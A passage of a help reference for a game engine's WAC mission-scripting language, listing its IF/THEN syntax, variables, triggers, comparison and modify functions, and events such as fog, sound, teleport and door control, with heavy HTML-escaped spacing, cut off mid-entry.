44645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751///////////////////WAC HELP 1（MED）///////////////////;wac file - nestable IF/THEN/ELSE/ENDIF boolean logic;;WAC post directory w:\\vp\\program\\wac - commands listed in GAME.WAC;WAC debug screen under shift-F12, numlock arrows to select and scroll;;GLOBAL WAC is GAME.WAC (executed first);;MISSION WAC is misname.WAC (executed second);;Left to Right order of operations;;---WAC LANGUAGE COMMANDS;nestable flow control;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; IF THEN ELSE ENDIF;boolean logic;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; AND OR XOR;function modifier;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; NOT;comments;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ; /;;Syntax - parens optional, line returns and tabbing optional;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if trigger1(params) and trigger2(params) then;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; event1(params);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; event2(params);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; endif;;Example;;&amp;nbsp;&amp;nbsp; I want to open doors in group 12 the first time I enter area 1501;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if location(1501) and never() then;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; opendoors(12);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; endif;;---VARIABLES &amp;amp; IMMEDIATES (a variable can always be used as an immediate);\"STRING\"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; immediate string value;#&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; immediate decimal number;anim_move&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; immediate equate from ADM file;ammo_name&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; immediate ammo name (ex. ammo2tgt ammo_rocket 1);fx_fxname&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; immediate effect name (ex. fxrain fx_effect_lightning);effect_name&amp;nbsp;&amp;nbsp;&amp;nbsp; immediate effect name (ex. fxrain effect_lightning);SS_SoundSet&amp;nbsp;&amp;nbsp;&amp;nbsp; immediate soundset name;sSoundSet&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; immediate soundset name (alternate syntax);face_name&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; immediate face name (ex. ssnface 45 face_happy);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; face_normal;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; face_happy;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; face_sad;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; face_smirk;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; face_angry;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; face_surprise;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; face_disgust;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; face_fear;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; face_aggressive;;V#&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; V0 to v511 game variables, cleared at start of mission;G#&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; G0 to vG11 global variables, not cleared during link;M#&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Music Script Variable;result&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; current return/accumulator value (mostly for debug);ticks&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; number of seconds into game;GameOver&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true is game is over;Win&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if blue team won;Lose&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if red team won;wind&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; used by SWING, FLICKER, and particle wind2;health&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; player's health/hp value;mana&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; player's mana;neartype&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; the type of the nearest enemy (from items.def dialog);neardist&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; the distance to the nearest organic;nearmove&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; the anim move of the nearest organic (setable);nearid&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; the unique dcb/id of the nearest organic;neartid&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; the id of the organic's target or 0 if no target;nearblind;nearflying;nearguard;nearSSN;nearWP;nearGroup;nearHP;deadDist&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; the nearest corpse info;DdeadType;ddeadSSN;DdeadMove;DdeadGroup;bbadDist&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; the nearest badguy info (team 2);bbadType;bbadSSN;bbadMove;bbadGroup;---TRIGGERS (# param can be number or variable);never()&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if current IF has never fired, for one time only events;elapse(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if past # seconds since current IF activated;;-IF Link (these commands fire once only for every fire of linked IF);previous&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if previous (same nesting level) IF fired;chain(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if previous (same nesting level) IF fired # seconds ago;link(#1,#2)&amp;nbsp;&amp;nbsp;&amp;nbsp; true if IF #1 away from current IF fired #2 seconds ago;;-Game Time (seconds of WAC script running);past(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if past # seconds into game, keeps firing after #;before(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if before # seconds into game.&amp;nbsp; keeps firing before #;ontick(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if ontick #, only fires once;;random(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; randomly true 1 in # times, sets RND for additional tests;location(#)&amp;nbsp;&amp;nbsp;&amp;nbsp; true if you are at that music location;area(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if within MED area without checking vertical;area3D(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if within MED 3D area;outside()&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if you are not in a blink box;waveready()&amp;nbsp;&amp;nbsp;&amp;nbsp; true if no talking going on;groupdead(#)&amp;nbsp;&amp;nbsp; true if entire group is dead;groupalive(#)&amp;nbsp; true if anyone in group is alive;ssnwounded(#)&amp;nbsp; true if ssn is wounded;ssndead(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if ssn is dead;ssnalive(#)&amp;nbsp;&amp;nbsp;&amp;nbsp; true if ssn is alive;ssnride(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if any organic is standing on SSN;ssnonssn&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if SSN is standing on SSN;ssnnearssn&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if SSN is near SSN within dist;ssnlosssn&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if SSN is near SSN within dist and has LOS;ssnseesssn&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if SSN is near SSN within dist and can see it;meride(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if player is standing on SSN;meattached(#)&amp;nbsp; true if player is attached to SSN;medrive(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if player is driving SSN;meongun(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if player is on emplaced weapon on SSN;ssnloc(#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp; true if vehicle or person is in music location;ssnarea(#,#)&amp;nbsp;&amp;nbsp; true if vehicle or person is in 2D med area #;ssnarea3D(#,#) true if vehicle or person is in 3D med area #;dooropen(#)&amp;nbsp;&amp;nbsp;&amp;nbsp; true if group # has door open;event(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if med event has triggered;squadevent(#)&amp;nbsp; true if squad event is in que, sets squadSSN to talker;playerfired(#) true if player has pressed fire and has slot # selected;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1=knife, 2=small arm, 3=main weapon, ect..;;---VARIABLE COMPARE;eq(#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if #==#;ne(#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if #!=#;lt(#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if #&amp;lt;#;gt(#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if #&amp;gt;#;le(#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if #&amp;lt;=#;ge(#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if #&amp;gt;=#;true(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if #!=0;false(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; true if #==0;;---VARIABLE MODIFY;set(var,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; set var to #;add(var,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add # to var;sub(var,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; subtract # from var, clamp at 0;inc(var)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add 1 to var;dec(var)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; subtract 1 from var, clamp at 0;---EVENTS (# param can be number or variable);squadclear&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; clears squadevent selected by squadevent(#);forceanim(anim)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; forces all organics into anim slot (debug only);report(\"text\")&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pop-up debug report window;report#(\"text\",#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pop-up debug report window with number;text(\"text\")&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; output text to chat - right side;text#(\"text\",#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; output text to chat w/# - right side;consol(\"text\")&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; output text to consol - left side;consol#(\"text\",#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; output text to consol w/# - left side;;flash&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; produce a flash of lightning &amp;amp; thunder;farflash&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; produce a far away flash of lightning &amp;amp; thunder;quake(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; earthquake for # 10th of a seconds;;colorfade(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; seconds for color to transition (zero is normal);sun(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets sun rgb&amp;nbsp;&amp;nbsp;&amp;nbsp; ENV override;sky(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets sky rgb;ground(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets ground rgb;ceiling(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets ceiling rgb;floor(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets floor rgb (inside ground);lightning(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets the color of the lightning;cloud(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets the cloud color;gain(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets the brightness of the whole scene;;fogcolor(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; set fogcolor to R,G,B, changes at color fade rate;fog(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; same as fogcolor;skyfogcolor(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; set skyfogcolor to R,G,B;skyfog(#,#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; same as skyfogcolor;fogtype(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; set fog type 0=fog, 1=haze, 2=haze wall, 3=fog wall;fogdist(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets fogdist to # meters;movefog(#,#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; move fogdist to # meters over # seconds;skyspeed(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets the sky movement speed;skyheight(#)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sets the height of the sky;;sound(sSSNAME, dist, head)&amp;nbsp; plays soundset at distance(meters) and heading(bangle);;nearwave(\"wave.wav\", dist) plays wave file from the mouth of the nearest enemy with max dist to be heard;nearanim(anim_move)&amp;nbsp;&amp;nbsp;&amp;nbsp; sets the nearest enemy to ADM move slot;;SSNwave(ssn,\"wave.wav\", dist) plays wave file from the mouth of the ssn with max dist to be heard;wave(\"wave.wav\", dist) plays wave file from mouth of player;SSNanim(ssn, anim_move)&amp;nbsp;&amp;nbsp;&amp;nbsp; sets the ssn to ADM move slot;SSNradio(ssn,\"wave.wav\")&amp;nbsp; sets the ssn to talk on radio;;SSNmax(ssn, maxengage) set max engage distance;SSNmin(ssn, minengage) set min engage distance;SSNatt(ssn, maxattack) set max attack distance;SSNSpawn(ssn, spawn count) set the spawn count, 0=don't respawn;GroupMax(group, maxengage) set max engage distance;GroupMin(group, minengage) set min engage distance;GroupAtt(group, maxattack) set max attack distance;GroupSpawn(group, spawn count) set the spawn count, 0=don't respawn;remove(grp)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; remove group # without a trace;kill(grp)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; kill group #;removeSSN(ssn)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; remove SSN # without a trace;killSSN(ssn)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; kill SSN #;teleport(grp,tgt)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; teleport group # to target #;telessn(ssn, tgt)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; teleport SSN # to target #;targetfx(tgt)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; create med particle fx at target #;sound2tgt(ss,tgt)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; create ssoundset at target # (ex. sound2tgt sSoundSet 1);ss2ssn(ss,ssn)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; create ssoundset at center of ssn;ammo2tgt(ammo,tgt)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; create ammo # at target # (ex. ammo2tgt ammo_rocket 1);fx2tgt(fx,tgt)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; create fx # at target # (ex. fx2tgt effect_lightning 1);opendoors(group)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; open doors in group #;closedoors(group)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; close doors in group #;SSNtoWP(ssn, wp)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; redirect SSN to WP list;GtoWP(group, wp)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; redirect Group to WP list;ammorain(ammo)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; rain down ammo # somewhere near player;ammoarea(ammo, area)&amp;nbsp;&amp;nbsp; rain down ammo # somewhere inside area #;fxrain(fx)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; rain down effect # somewhere near player;ssncspd(ssn,speed)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; set ssn to combat speed of #;ssnpspd(ssn,speed)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; set ssn to patrol speed of #;ssnuse(ssn)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; snap ssn to emplaced weapon if within 3 meters;ssnrelease(ssn)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; remove ssn from emplaced weapon;ssn2ssn(ssn, ssn)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; have ssn goto ssn and try to snap to emplaced;ssnface(ssn, face)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; set face expression of ssn;ssnguard(ssn, #)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; set ssn to guard 1=ON, 0=Off;ssnturn(ssn, heading)&amp;nbsp; turn ssn to heading 0-360;ssnhp(ssn, 